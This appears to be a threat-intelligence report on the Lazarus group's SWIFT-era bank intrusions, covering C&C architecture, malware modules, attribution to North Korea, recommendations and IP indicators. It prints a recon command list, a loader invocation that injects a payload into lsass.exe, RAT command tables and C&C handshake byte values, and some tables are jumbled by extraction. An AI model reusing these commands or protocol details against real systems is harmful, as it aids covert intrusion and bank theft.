{
    "id": "125532b9-72fd-4b52-93e6-9a5aae63ff51",
    "created_at": "2022-10-25T16:48:19.057992Z",
    "updated_at": "2025-03-27T02:17:23.606016Z",
    "deleted_at": null,
    "sha1_hash": "63539ba31b08519f49476e7d509f0b1a9b2445d0",
    "title": "",
    "authors": "",
    "file_creation_date": "2017-05-29T17:31:14Z",
    "file_modification_date": "2017-05-29T17:31:21Z",
    "file_size": 6410126,
    "plain_text": "# LAZARUS ARISEN\n\n##### ARCHITECTURE / TOOLS / ATTRIBUTION\n\n\n-----\n\n#### INTRODUCTION\n\nIn February 2016, hackers reportedly attempted to steal approximately\n1 billion USD from the Central Bank of Bangladesh through SWIFT. In February\n2017, several Polish banks were compromised.\n\nSecurity researchers analysed the malware code, chiefly using this to attribute\nactivity to Lazarus group. As tools are often reused by different groups, while\nhelpful, malware analysis does not provide conclusive evidence of attribution.\n\nGroup-IB researchers investigating Lazarus group collected a broad range\nof data, both technical and strategic, which places clear attribution on North\nKorea. The team detected and thoroughly analyzed multiple layers of C&C\ninfrastructure used by Lazarus and have identified North Korean IP addresses\nfrom which the attacks were ultimately controlled. The following report is\nan overview of this group’s attack methodology for financial institutions, the\nmalware employed and review of their targets.\n\n### 2 Lazarus arisen:\n\n\n-----\n\n#### 01 KEY  FINDINGS\n\n###### Unique tools  and C&C infrastructure\n\nThrough analysis of Lazarus activity, Group-IB gained deep insight on a\ncomplex botnet infrastructure built by the hacker group to conduct their\nattacks. To mask malicious activity, the hackers used a three-layer architecture\nof compromised servers with SSL encrypted channels established between\nthem. In addition to encrypted traffic, data sent through SSL channel was\nadditionally encrypted. The attackers achieved anonymity by employing a\nlegitimate VPN client - SoftEther VPN. In some cases, they also used corporate\nweb servers that were part of the attacked infrastructure.\n\nTo control infected machines, the hackers employed multi-module tools,\nattempting to complicate malware analysis. That said, they managed to\nconduct several successful attacks without employing 0day exploits. Lazarus\ndemonstrated a flexible approach to attacks by applying different hacking tools,\nwhich prevented their detection by endpoint security solutions.\n\n###### Links to  North Korea\n\nAccording to our investigation of the Lazarus infrastructure, the threat actors\nconnected to the end C&C layer (Layer3) from two North Korean IP addresses\n210.52.109.22 and 175.45.178.222. The second IP-address relates to Potonggang\nDistrict, perhaps coincidentally, where National Defence Commission is\nlocated — the highest military body in North Korea\n\nAdditional evidence was confirmed that Lazarus links to North Korean hackers\nby Group-IB specialists through analysis of pubic sources. We found a news\nreport from a South Korean Arirang TV agency, dated 2016, about an attack on\nSouth Korean television stations and banks as part of DarkSeoul operation. This\nattack performed by North Korean hackers and was investigated by the South\nKorea’s National Police Agency, who detected two IP addresses 175.45.178.19 and\n175.45.178.97, used by hackers to control malware. Both IP addresses are in the\nsame block of IP addresses the IP 175.45.178.222, which was discovered by\nGroup-IB specialists.\n\nLazarus is purportedly controlled by Bureau 121, a division of the\nReconnaissance General Bureau, a North Korean intelligence agency.\nBureau 121 is responsible for conducting military cyber campaigns.\n\n### 3 Lazarus arisen:\n\n\n-----\n\n###### Masquerading  as Russian hackers\n\nSince 2016, the hackers have tried to mask their activity by pretending to\nbe Russian hackers. They added specific debugging symbols and strings\ncontaining Russian words to a new version of Client_TrafficForwarder, a\nmodule designed to proxy network traffic. To protect their executables,\nthey used Enigma Protector, a commercial product, which was created by a\nRussian software developer. They also used exploits for Flash and SilverLight\nfrom sets of exploits created by Russian-speaking hackers.\n\nThese masquerade techniques did initially mislead some researchers who\nconducted express analysis of malicious code.\n\n###### Emerging trend\n\nA state-sponsored hacker group Lazarus managed to gain fraudulent\naccess to the SWIFT network of attacked banks. This is believed to be a\ngrowing trend: state-sponsored hackers are demonstrating an increased\ninterest in conducting attacks on financial institutions, which are considered\na component of the national critical infrastructure in some countries. At the\nmoment, only a few similar incidents have been detected. For example, in\n2010-2013 the NSA reportedly penetrated the SWIFT banking network and\nmonitored a number of Middle East banks. In late 2016, attacks on Ukrainian\nbanks were conducted, allegedly as part of the BlackEnergy operation.\nHowever, researchers expect that the number of attacks on financial\ninstitutions by state-backed hackers may significantly increase in the future.\n\n###### Victims\n\nThe earliest indicator of compromise detected by Group-IB is dated March\n2016. This was directly after the Central Bank of Bangladesh incident,\nwhich took place in February 2016, where attackers attempted to steal $1\nbillion USD. Only a spelling mistake in an online bank transfer instruction\nhelped prevent them from stealing more than $81 million USD. Following\nthis incident, the group modified its tactics and tools, adapting them to the\nchanging environment and misleading researchers.\n\n\nThrough analysis of compromised networks, Group-IB identified IP addresses\nof universities in the US, Canada, Great Britain, India, Bulgaria, Poland,\nTurkey, pharmaceutical companies in Japan and China, as well as government\nsubnets in various countries.\n\n### 4 Lazarus arisen:\n\n\n-----\n\n#### 02 ATTACK To conduct attacks, the criminals\ndeveloped toolsets to control C&C\n\n#### PREPARATION AND servers and infected machines, built\n\na three-layer C&C infrastructure,\n\n#### IMPLEMENTATION and compromised dozens of large\n\nweb resources.\n\n###### 2.1 \u0007Infection  of web resources\n\nTo infiltrate systems of their interest, Lazarus conducted watering-hole attacks\nleveraging compromised resources often visited by their potential victims,\nsuch as websites of financial regulators and government agencies in several\ncountries.\n\nSome of these resources are listed below:\n\n\n\n**• knf.gov.pl — The Polish Financial Supervision Authority**\n\n**• cnvb.gob.mx — National Banking and Securities Commission, Mexico**\n\n**• brou.com.uy — \u0007Banco de la República Oriental del Uruguay, a state-owned**\nbank in Uruguay\n\n\nThrough examination of a code on a web server with exploits, GroupIB specialists detected a list of 255 IP address ranges. That said, hackers\ninfected only those users who visited the website from a computer within the\nspecified IP range. Based on this list, researchers have compiled a map of the\ncountries that were of interest to the attackers, which is presented below.\n\n### 5 Lazarus arisen:\n\n\ncountries that were of interest to the attackers, which is presented below.\n\n\n-----\n\nTo gain access to websites of financial regulators and bank local networks,\nhackers used known vulnerabilities in JBoss and Liferay. They compiled an\nexploit for Silverlight CVE-2016-0034 (MS16-006) which earlier was included\ninto RIG and Angler exploit kits, they also used Flash exploits from Neutrino\nExploit Kit.\n\n###### 2.2 \u0007Establishment of C&C infrastructure: \n\nAttackers created a 3-tier infrastructure that consisted of compromised\nservers, between which the hackers established SSL encrypted channels. The\nnetwork interaction with the attacked computer was carried out only from the\nLayer 1 server, which acted as a C&C server. In some cases, hackers placed the\nLayer 1 server inside the organization attacked in order to reduce the risk of\ndetection. They gained access to these servers by brute forcing passwords for\nRDP.\n\n**Hackers used original set of tools:**\n\nServer_RAT Used to manage windows-based server infrastructure\n\nServer_TrafficForwarder Forwards traffic from one external server to another\n\nBackend_ Listener Establishes connection with servers with installed Server_\nRAT, gets commands directly from the threat actor\n\nAdmin_Tool Admin tool to send commands to infected computers\n\nSWIFT toolbox Used to work with SWIFT, consists of Alliance software\nHook Files and SWIFT transactions Information\nHarvester.\n\nThrough in-depth analysis of the tools used by the attackers, Group-IB\nspecialists identified the scheme of communications between nodes within\nthe C&C infrastructure.\n\n### 6 Lazarus arisen:\n\n\n-----\n\n**Three-layer C&C server infrastructure**\n\n\n**Server_RAT was installed on all infrastructure levels to control the**\n**compromised infrastructure**\n\nServer_RAT constantly listens on port 3365, to which attackers connected\nto control the server. To ensure the availability of the specified port,\nthe malicious program added a special rule to the firewall that allowed\nincoming connections to this port. Infected computers performed an\noutgoing connection to the compromised server acting as proxy via port\n443. Typically outbound connections on this port are allowed in corporate\nnetworks.\n\nBased on analysis of the Server_RAT functionality, Group-IB specialists\nidentified that Server_RAT responds to certain requests in a specific way.\nKeeping in mind that Server_RAT constantly keeps port 3365 open, we\nscanned the Internet for open ports 3365. Following this, we checked a\nlist of detected servers to identify those servers where Server_RAT was\ninstalled. As a result, Group-IB specialists received a list of 74 IP addresses,\nwhich are presented in the Indicators of Compromise section.\n\n**Server_TrafficForwarder was installed on the first and second server level**\n**— this module redirected traffic from one server to another.**\n\nIn some cases, Server_TrafficForwarder was installed on servers inside the\nattacked organization. This approach allows the criminal to avoid detection\nof suspicious connections to the external network or bypass network\nconnection restrictions with prohibited connections to the external network\nfrom specific computers/servers, which is often applied by companies to\nprotect the most critical PCs, such as those of SWIFT operators.\n\n### 7 Lazarus arisen:\n\n\n-----\n\nAfter the start, Server_TrafficForwarder reads the contents of the key and\ncertificate files from the root directory that will be used to create an SSL\ntunnel. That said, the file does not contain any information about the servers\nto which traffic should be transferred. At the first start, hackers manually\nspecify the port to listen on as well as the address of the C&C server to\nwhich traffic is to be sent. In the event the port is not specified, the program\nlistens on a random port and waits for incoming connections.\n\nTo verify communication with a compromised server, hackers check if the\nclient is appropriate: they send the first network request; when a response\nis received from the client, they decrypt it and compare with a previously\nknown response. In the event the responses are different, the connection is\nbroken.\n\n**The table below contains all commands available:**\n\nCommands of the first version: Commands of the second version:\n\nCommands Description Commands Description\n\n0x1095   - NONE   \n0x1096 Collects and sends system GINF Collects and sends system\ninformation information\n\n0x10AA Gets the configuration GCFG Gets the configuration\n\n0x10AB Changes the configuration SCFG Changes the configuration\n(including the port on which (including the port on which\nit listens for connections) it listens connections)\n\n0x10AE   - SLEP   \n0x10AF   - HIBN   \n0x10B3 Reads a private key file and LCLR Records data to a file\nsends it to the operator\n\nLDWN Reads a private key file and\n\n0x10B4 Records data to a file sends it to the operator\n\nThe only difference in the Server_TrafficForwarder configuration on Layer\n1 and Layer 2 servers respectively is that Server_TrafficForwarder installed\non Layer 1 accepts traffic from port 443 and forwards it on the same port\nof Layer 2. While Layer 2 accepts traffic on port 443 and forwards it to port\n8080 of Layer 3.\n\n### 8 Lazarus arisen:\n\n\n-----\n\nTo encrypt all of its network connections, the traffic forwarder uses the\nstatically linked wolfSSL libraries and SSL certificates which are generated\nby a pre-defined template. The “Issued for“ field always contains a third-level\ndomain slash an email address.\n\n**A few examples are shown below:**\n\n\n\n- www.resfinan.com/emailAddress=info@resfinan.com\n\n- finews.otzo.com/emailAddress=master@otzo.com\n\n- host.global.com/emailAddress=info@host.global.com\n\n- latest.ignorelist.com/emailAddress=consult@latest.ignorelist.com\n\n\nWith information about this template, Group-IB specialists managed to detect\nsimilar certificates and associated hosts. With these indicators, you can check\nif your organization was, or is, under attack by Lazarus.\n\n**Backend_Listener is software installed by attackers on Layer 3 servers. The**\n**program performs communications with other servers, receives commands**\n**from the administrator and sends them in chain order to the end infected**\n**computer.**\n\n**Backend_Listener listens on the two ports:**\n\n  - port 8080, to which it accepts SSL connections from Layer 2 servers.\n\n  - port 9090, to which it accepts connections from the control system\n(Admin_Tool).\n\nTo encrypt traffic, the wolfSSL open source library is used. After the\napplication is launched, the private key and certificate files are loaded from\nthe root directory. These files are used to encrypt traffic between the C&C\nserver and connected clients.\n\nTo defend against security solutions designed to “unpack” SSL encrypted\ntraffic, Backend_Listener encrypts all data sent over an SSL channel using an\nadditional reversible encryption algorithm and performs legitimacy checks.\n\nTo reverse-engineer the protocol of server communications with clients,\nGroup-IB specialists have developed a client that successfully connects to\nboth above-mentioned ports.\n\n### 9 Lazarus arisen:\n\n\n-----\n\n**This allowed us to analyze communications between the Admin-Tool and**\n**Backend_Listener and we discovered that:**\n\nAdmin_Tool must have an key pair that is identical to the server\n\nAdmin_Tool sends a customized Hello-package that differs from the one\nthat is provided by the library. By default this package (msg) is specified in\nthe library as follows:\n\n```\n#ifndef WOLFSSL_ALT_TEST_STRINGS\nchar msg[32] = «hello wolfssl!»;  /* GET may make bigger */\n\n```\nThe correct Hello packet that will be accepted by Backend_Listener must be of the\nfollowing form:\n```\nstatic unsigned char msg[4] = { 0x11, 0x00, 0x00, 0x00, };\n\n```\nIn fact, this is an information packet, rather than a Hello packet, and its first byte\ncontains the length of the next packet sent («len»), while the rest bytes must be zero\nin this case.\n\n\nAdmin_Tool sends an encrypted (special) packet with a length from the\nprevious packet (len).\n\nThe server decrypts the contents of the packet sent.After decryption, the\nfollowing conditions must be true:\n\n```\n(DWORD)&decrypted_buff[5] == len\n(DWORD)&decrypted_buff[15] == len\n\n```\nwhere len is the length of the packet\n```\nstatic unsigned char msg[4] = { 0x11, 0x00, 0x00, 0x00, };\nstatic unsigned char ecnrypted_str[17] = { 0x38, 0x94, 0x3C, 0x6A, 0x58, 0x39,\n0x1A, 0x56, 0x81, 0x4B, 0x09, 0x99, 0x1D, 0xE0, 0xCF, 0x81, 0x3F };\n\n```\n\n### 10 Lazarus arisen:\n\n\n-----\n\nAdmin_Tool sends DWORD with len2 < 201 where len2 is the length of the\nnext package.\n\nAdmin_Tool sends encrypted (special) package #2. It’s length is determined\nin the previous package.\n\n```\nstatic unsigned char ecnrypted_str[17] = { \n0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,\n0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,\n  0xC8, 0x88, 0xE0, 0xE4, 0x94, 0x85, 0xCC, 0xD1, 0x03, 0x00,\n\n```\n\nServer decrypts the content of the package, and the following rules should\nwork there after decryption:\n\n```\n(DWORD)&decrypted_buff[4] == 0xD1CC8594 \n(DWORD)&decrypted_buff[8] == 3\n\n```\nOnly if all validity checks are made, the traffic is forwarded from one port to another in 2\nstreams. Following this, when the client connects to the first port (8080), the service will\nforward the traffic from the first port to the second one, and back.\n\nThe operators connected to port 9090 of Layer 3 servers from the following IP\naddresses:\n\n- 210.52.109.22 (North Korea)\n\n- 175.45.178.222 (North Korea)\n\n- 157.7.135.182 (Japan) and 202.101.36.45 (China) - via SoftEther VPN\n\n\n**VPN: the attackers installed SoftEther VPN (http://softether.net/) service**\nsupported by University of Tsukuba, Japan on some servers to unsure\nadditional level of anonymity.\n\n**Lazarus have chosen this service for the following reasons:**\n\n\n\n- This legitimate application isn’t detected by security solutions\n\n- It can establish VPN connection via ICMP or DNS to avoid detection by network\nsecurity solutions\n\n- It contains Dynamic DNS function, which means that if a compromised system has\na dynamic IP address, the attacker can always find it by DNS name connected to\nthe VPN client\n\n- This VPN client supports Windows, Linux, FreeBSD, Solaris, Mac OS X\n\n\n### 11 Lazarus arisen:\n\n\n-----\n\n###### 2.3 \u0007Tools to control infected PCs\n\nIn addition to multi-layer server structure, hackers developed a specialized\ntoolset to perform remote control over infected PCs.\n\nThe group actively attempted to conceal their activity, complicating malware\ndetection and analysis as much as possible. All tools consist of modules, which\nwere delivered separately to target organizations only. To complicate malware\ninvestigation, criminals encrypted and obfuscated their tools.\n\nModular architecture of the victim’s infection process provides both additional\nflexibility and anonymity throughout the cyber-attack. This scheme allows\nhackers to divide software development activity between teams, as well as to\nensure the reuse of program code.\n\nRecon Performs initial reconnaissance to determine if a systems is of\ninterest to the threat actors\n\nDropper Extracts and decrypts Loader\n\nLoader Decrypts the payload — Client_RAT or Client_TrafficForwarder\n— and injects into the legitimate process\n\nClient_TrafficForwarder Forwards operator’s commands from external network into\ncorporate network\n\nClient_RAT Provides full control over the target system\n\n**Recon is a backdoor that is initially installed on the target machine through**\n**successful execution of exploits. This module is used by hackers to perform**\n**initial reconnaissance to search for systems of interest.**\n\nOnce launched, the program adds itself to the auto-start by copying its file\nto the directory \"%USERPROFILE%\\AppData\\Roaming\\Microsoft\\Windows\\\nStart Menu\\Programs\\Startup\", collects data about the system and network\nenvironment and sends them to the C&C server.\n\n\nBelow is a list of data collected:\n```\ncmd.exe /c hostname\ncmd.exe /c whoami\ncmd.exe /c ver\n\n```\ncmd.exe /c ipconfig -all\n```\ncmd.exe /c ping www.google.com\ncmd.exe /c query user\ncmd.exe /c net user\ncmd.exe /c net view\ncmd.exe /c net view /domain\ncmd.exe /c reg query «HKCU\\SOFTWARE\\Microsoft\\Windows\\\nCurrentVersion\\Internet Settings»\ncmd.exe /c tasklist /svc\n\n```\ncmd.exe /c netstat -ano | find «TCP»\n\n\n### 12 Lazarus arisen:\n\n\n-----\n\nIn the event the system is not of interest, the module will use the \"killkill\"\ncommand to remove itself from the infected system. If the system is of interest,\nthen Recon downloads Dropper using the “http” command. Dropper will then\ninstall Client_RAT to the infected system as follows:\n\n\n1 2 3\n\n###### RECON DROPPER LOADER\n\nCLIENT_RATDROPPERLOADER Recon decrypts and embeds Dropper LOADERCLIENT_RAT Dropper decrypts and embeds Loaderextracts decrypted CLIENT_RAT Loader decrypts and embeds Client_RAT\n\nClient_RAT\n\n\n###### CLIENT_RAT\n\n\n**Dropper extracts and decrypts Loader, embeds it into the system and**\n**extracts Client_RAT.**\n\nTo decrypt the configuration file, Dropper needs MD5 encryption key, which\nonly the attacker knows.\n\nGroup-IB specialists have analyzed two versions of Dropper. There are no\nfundamental differences between them: both versions were used to decrypt\nthe loader and encrypted payload, as well as to ensure loader persistence in\nthe system.\n\n**Version 1** **Version 2**\n\nCommands of the first version: Commands of the second version\n\nArguments Description Arguments Description\n\ndropper.exe -l Enumerates system dropper.exe -x Enumerates system services\nservices [key] -l\n\ndropper.exe -e Retrieves and decrypts dropper.exe Extracts and decrypts the payload\n\n[path] encrypted payload and -x [key] -e from config and sets it as a service\nsaves it to the specified file [servicename]\n\n[config]\n\ndropper.exe –a Installs the library as a\n\n[service name] service dropper.exe -x Installs implants by adding\n\n[path to DLL] [key] -f information about them to the\n\nsystem registry\n\ndropper.exe Calls OpenEventA with a special\n-x [key] -o event name\n\n[eventname]\n\ndropper.exe Calls OpenEventA with a special\n-x [key] -t event name, then calls Setvent API\n\nIn addition, Dropper can read executable data from registry keys and embed\nthem in the selected process. The executable data is read from the following\nregistry keys:\n\n   - HKLM\\SYSTEM\\CurrentControlSet\\Services\\<name of service>\\Security\\Data2\n\n   - HKLM\\SYSTEM\\CurrentControlSet\\Services\\<name of service>\\Security\\Data3\n\n### 13 Lazarus arisen:\n\n\n-----\n\n**Loader is used to decrypt the payload — Client_RAT or Client_TrafficForwarder**\n**— and inject it into the legitimate process (for example, in lsass.exe)**\n\nHackers manually specify the C&C server at the time when the main program\nis started. That’s why even if researchers detect the loader they cannot\nidentify where the C&C server is located, by whom it is controlled, and which\nport is used for connection. In some cases, an additional loader was used by\ncriminals.\n\nExample of loader launch:\n\nloader.exe -d «encrypted_payload.bin» -p 1540 -s [encrypted_C&C:port] -r [encrypted_commands]\n\n\nTwo more arguments:\n–r (functionality has not been\nidentified) and –s\n\n\nArgument -d:\nName of the file\nwhere Client _Rat or\nClient_Forwarder are stored\nin encrypted form\n\n\nArgument -p:\nID of the process (for example, lsass.\nexe) in which the payload – Client_RAT\nor Client_TrafficForwarder – should be\nembedded\n\n\n**Client_TrafficForwarder**\n\nThis module was installed on one of the PCs in the internal network of the\nattacked organization. It proxies traffic from C&C server to PCs in the local\nnetwork of the attacked organization.\n\n**Client_RAT**\n\nThe Client_RAT program provides full control over the target system: it allows\nyou to analyze the system, download and execute files, transfer data from the\ninfected computer to the C&C server.\n\nCommunications with the C&C server are performed over an encrypted SSL\nchannel. For this purpose, Client_RAT uses statically linked libcurl libraries,\nversion 7.47.1 (FEB 2016).\n\n### 14 Lazarus arisen:\n\n\n-----\n\nThis program may execute the following commands received from the C&C\nserver:\n\n**Command** **Description** **Command** **Description**\n\nNONE Do not execute any commands DIR List files in the selected\n\ndirectory\n\nGINF Collect and send extensive\nsystem information about the DIE Remove itself\nPC from the system\n\nSLEP Do not execute any commands DEL Delete selected file\n\nHIBN Do not execute any commands WIPE Delete the selected file and\n\nmake it unrecoverable\n\nDRIV Get information about available\ndisks in the system UPLD Upload the file to C&C\n\nDIRP List files with the specified SCFG Get a new bot configuration\nextension\n\nDRIV Enumerate installed drivers\n\nCHDR Change current directory\n\nDOWN Download and run the file\n\nRUNX Get the user token\n\nCMDL Run the command and upload\n\nMOVE Rename specified file the result of its work to С&C\n\nFTIM Set the timestamps of the file GCFG Download bot configuration\n%windir%/system32/kernel32.dll\nto the specified file\n\nRUN Execute command\n\nNEWF Create a new directory with the\n\nPVEW List running processes\n\nspecified name\n\nPEEX Inject the code in the process\n\nZDWN Presumably download the file/\n\nexplorer.exe\n\nfiles\n\nPKIL Terminate the process with the\n\nPEIN Inject code in the specified\n\nselected PID\n\nprocess\n\nTCON Presumably connect to the\nspecified network node\n\n### 15 Lazarus arisen:\n\n\n-----\n\n#### 03\n\n\n#### ATTACK ORGANIZERS\n\n\n###### 3.1 \u0007Involvement  of North Korea\n\nDue to analysis of Lazarus infrastructure, Group-IB specialists have detected\nthat the attack was controlled from two IP addresses:\n\n\n\n- 210.52.109.22 belongs to an autonomous system China Netcom. However, some\nsources indicate that the set of IPs 210.52.109.0/24 is assigned to North Korea.\n\n- 175.45.178.222 refers to a North Korean Internet service provider. The Whois\n**service indicates that this address is allocated to the Potonggang District,**\n**perhaps coincidentally, where Natinal Defence Commission is located — the**\n**highest military body in North Korea**\n\n\nThrough investigation of public information, we came across a TV report\nfrom a South Korean news agency Arirang News dated 2016\n\nOn the screen behind the host, Group-IB specialists noticed two IP addresses\n175.45.178.19 and 175.45.178.97, which had been used to control Ghost RAT\nmalware. Both IP addresses are in the same set of IP addresses as an IP address\n175.45.178.222 that was discovered by Group-IB specialists.\n\nThe South Korea’s National Police Agency reportedly identified that the cyberattack had been performed from the unfinished North Korean Ryugyong hotel.\nGroup-IB could not confirm this location attribution.\n\n### 16 Lazarus arisen:\n\n\n-----\n\nThe DarkSeoul group (aka Lazarus) is controlled by Bureau 121, a division of the\nReconnaissance General Bureau, a North Korean intelligence agency. Bureau 121\nis responsible for conducting military cyber campaigns.\n\n**1st Bureau Operations**\n\n**2nd Bureau Reconnaissance**\n\n**3rd Bureau Foreign Intelligence**\n\n###### Reconnaissance\n\n**5th Bureau Inter-Korea Dialogue**\n\n###### General Bureau\n\n**6th Bureau Technical**\n\n**7th Bureau Rear Services**\n\n**Bureau 121**\n\n###### 3.2 \u0007Masquerading  as Russian hackers\n\nStarting in 2016, the Lazarus group tried to mask their activity by\npretending to be Russian hackers:\n\n1. The Client_TrafficForwarder module includes debugging symbols and\nstrings containing Russian words in descriptions of commands received by\nmalware from the C&C server.\n\nIt’s worth noting that \"Russian commands\" received from the server are\nnot typical for a Russian native speaker, and in the case of the «poluchit»\n(to receive) command the meaning of the word contradicts the action (to\nsend) it is intended for.\n\nPoluchit (means \"to get\" in Russian)        \u0007Send a network address of the current\nLayer 2 server to the C&C server\n\n2. To protect their executables, hackers used Enigma Protector, a commercial\nproduct, which was created by a Russian software developer.\n\n3. Exploits for Flash and SilverLight were borrowed from the sets of exploits\ncreated by Russian-speaking hackers.\n\nThese techniques to mask attribution initially mislead some researchers\nconducting preliminary analysis.\n\n### 17 Lazarus arisen:\n\n\n-----\n\n#### 04 RECOMMENDATIONS\n\n**Updates of software and operating systems**\n\nTo prevent infection through execution of exploits, it is enough to update\nyour Microsoft and Adobe software.The Lazarus group uses known and\npatched exploits, rather than leveraging 0day vulnerabilities. That’s why,\neven usual software updates did not allow attackers to infiltrate corporate\nnetworks. Unfortunately, some of the attacked banks did not comply with this\nrequirement.\n\n**Network traffic analysis**\n\nEven if the criminals have managed to obtain access to the corporate\nnetwork, the attack can still be successfully prevented. After intrusion into the\ncompany’s network hackers still need to find systems of their interest, and\ngain access to them. It takes days and even months sometimes, and this time\nshould be used to detect the malicious activity.\n\nAttackers use malicious programs that transfer data to the C&C server —\nLayer 1. Communications between the infected computer and the C&C server\ncan be identified through network traffic analysis. All communications are\nencrypted, that is why you should use solutions that can detect network\nanomalies based on threat intelligence data.\n\n**Application whitelisting**\n\nApplication whitelisting should be introduced into critical bank servers. This\nwill prevent attackers from installing their remote control tools, monitoring\nfinancial transactions, and escalating privileges. It also helps to identify\nunauthorized attempts to run such malicious applications.\n\n**Checking indicators of compromise**\n\nThe “Indicators of compromise” section contains current and historical\nintelligence data. With these indicators, you can check if your organization\nwas, or is, under attack by Lazarus. The group uses legitimate compromised\nservers, that’s why these indicators can give false positives.\n\n**Response**\n\nAnd the most important thing: if you have detected trails of a targeted attack\nat any stage, you need to involve specialized companies for its analysis.\nIncorrect responses to the attack result in the attacker activity remaining\npartly undetected to enable criminals to achieve their goal — to steal money.\n\n### 18 Lazarus arisen:\n\n\n-----\n\n#### ABOUT  GROUP-IB\n\nGroup-IB is one of the global leaders in preventing and investigating hightech crimes and online fraud. Since 2003, the company has been active in the\nfield of computer forensics and information security, protecting the largest\ninternational companies against financial losses and reputational risks.\n\n**International honors**\n\nThe company is recognized by Gartner as a threat intelligence vendor with\nstrong cyber security focus and the ability to provide leading insight to the\nEastern European region and recommended by the Organization for Security\nand Co-operation in Europe (OSCE). In 2017 IDC Report named Group-IB the\nleader of the Russian Threat Intelligence Services Market. The company is a\nmember of the World Economic Forum working group on cybersecurity.\n\n**Clients worldwide**\n\nFortune 500 companies worldwide use Group-IB products and services.\nGroup-IB clients include top-tier banks and financial institutions, FMCG brands\nand industrial corporations, oil and gas companies, software and hardware\nvendors, telecommunications service providers the US, Western Europe, the\nMiddle East, Asia and Australia.\n\n**CyberCrimeCon2017**\n\nAnnual conference organized by Group-IB aims to empower global threat\nintelligence exchange in one of the hottest spot on cybersecurity map. Be the\nfirst to discover key cybercrime trends and get a chance to interact with the\nglobal experts directly, both on and off stage.\nLearn more on 2017.group-ib.com\n\n### 19 Lazarus arisen:\n\n\n-----\n\n###### Group-IB products and services\n\n Threat Intelligence\n\nLearn about threats, leakages,\nattacks, and hacking activity\nbefore they can harm your\nbusiness\n\n###### TDS Sensor  + TDS Polygon\n\nDetect malicious incidents in\nyour internal network to prevent\nattacks, intrusions, data leaks, and\nespionage\n\n###### Incident  Response\n\nCERT-GIB — 24/7 emergency\nresponse and effective incident\nmanagement\n\n\n###### Secure  Bank\n\nProtect online payments by\nidentifying fraud preparation and\nattempted execution on client\ndevices\n\n###### Brand  Protection\n\nPrevent online brand abuse,\nmanage reputational risks and\nreduce online counterfeit sales\n\n###### Computer Forensics  and Investigation\n\nThe largest computer forensics\nlaboratory in Eastern Europe with\n150+ successful investigations\nworldwide\n\n\nLearn more on group-ib.com\n\n\n### 20 Lazarus arisen:\n\n\n-----\n\n#### 05\n\n\n#### INDICATORS  OF COMPROMISE\n\n\n###### 5.1 IP addresses of attackers\n\n**IP** **Country**\n\n175.45.178.222 North Korea\n\n210.52.109.22 North Korea\n\n157.7.135.182 Japan\n\n202.101.36.45 China\n\n###### 5.2 \u0007IP addresses with  SoftEther VPN\n\n**IP** **Country**\n\n157.7.135.182 Japan\n\n202.101.36.45 China\n\n202.129.24.4 Thailand\n\n78.89.183.37 Kuwait\n\n31.3.225.57 USA\n\n207.162.24.86 Canada\n\n209.254.82.137 USA\n\n77.241.47.234 Russia\n\n173.198.127.221 USA\n\n180.18.169.69 Japan\n\n31.197.217.5 Italy\n\n140.123.92.101 Taiwan\n\n140.121.120.229 Taiwan\n\n### 21 Lazarus arisen:\n\n\n-----\n\n###### 5.3 IP addresses used to control the C&C infrastructure\n\n**IP addresses of compromised** **IP addresses of** **IP addresses of compromised**\n**hosts with Server_RAT** **compromised hosts** **hosts with Backend_Listener**\n**Listens on port 3365** **with PortForwarder** **Listens on ports 8080 and**\n\n**Redirects to port 443** **9090**\n\n140.121.120.229 180.94.69.107 12.49.13.202 31.192.208.xxx\n\n27.131.59.198 218.29.194.101 31.210.105.105\n\n194.78.90.21 140.119.98.20 202.129.24.4\n\n140.123.92.101 64.116.135.73 210.213.90.173\n\n31.210.105.105 140.115.31.220 187.109.80.61\n\n31.197.217.5 78.89.183.37 212.219.35.51\n\n182.77.60.35 221.132.18.43 203.131.230.104\n\n203.131.230.104 190.252.8.138 2.32.113.178\n\n80.60.105.128 31.210.119.142 187.44.139.252\n\n203.114.109.68 61.90.156.121 123.200.9.178\n\n165.123.67.111 212.34.228.66 82.144.131.5\n\n178.222.166.209 196.214.247.58 202.183.185.91\n\n140.114.122.178 12.49.13.202 209.105.239.42\n\n63.247.182.137 41.72.101.138 209.81.121.51\n\n140.121.100.63 60.96.139.113 140.115.31.220\n\n114.174.228.100 80.78.73.204 80.78.73.204\n\n202.183.185.90 212.30.75.210 140.115.42.147\n\n118.189.38.21 87.252.182.182 212.14.44.245\n\n203.66.57.237 166.111.80.223 165.123.67.111\n\n210.227.170.229 140.116.31.195 66.207.112.187\n\n180.18.169.69 24.201.106.142 203.66.57.237\n\n173.198.127.221 41.33.212.94 140.116.178.123\n\n86.120.134.50 31.192.208.227 140.116.31.195\n\n77.241.47.234 193.19.174.60 140.112.14.16\n\n182.73.40.130 220.132.243.188 202.183.185.90\n\n58.64.203.66 69.196.83.206 41.72.101.138\n\n81.93.72.18 62.210.146.3 59.120.19.101\n\n61.122.232.25 208.124.153.14 125.214.195.17\n\n209.254.82.137 140.112.90.235 69.196.83.206\n\n118.22.154.159 47.176.2.12 175.45.61.44\n\n207.162.24.86 164.70.22.40\n\n178.252.148.240 211.240.78.135\n\n212.14.44.245 202.56.120.210\n\n210.213.80.237 184.163.74.15\n\n180.234.11.19 210.241.42.173\n\n51.254.71.167 218.248.46.26\n\n41.41.241.194\n\n31.3.225.57\n\n69.91.178.16\n\n### 22 Lazarus arisen:\n\n|IP addresses of compromised|IP addresses of|IP addresses of compromised|\n|---|---|---|\n|IP addresses of compromised hosts with Server_RAT Listens on port 3365|IP addresses of compromised hosts with PortForwarder Redirects to port 443|IP addresses of compromised hosts with Backend_Listener Listens on ports 8080 and 9090|\n|140.121.120.229 180.94.69.107 27.131.59.198 218.29.194.101 194.78.90.21 140.119.98.20 140.123.92.101 64.116.135.73 31.210.105.105 140.115.31.220 31.197.217.5 78.89.183.37 182.77.60.35 221.132.18.43 203.131.230.104 190.252.8.138 80.60.105.128 31.210.119.142 203.114.109.68 61.90.156.121 165.123.67.111 212.34.228.66 178.222.166.209 196.214.247.58 140.114.122.178 12.49.13.202 63.247.182.137 41.72.101.138 140.121.100.63 60.96.139.113 114.174.228.100 80.78.73.204 202.183.185.90 212.30.75.210 118.189.38.21 87.252.182.182 203.66.57.237 166.111.80.223 210.227.170.229 140.116.31.195 180.18.169.69 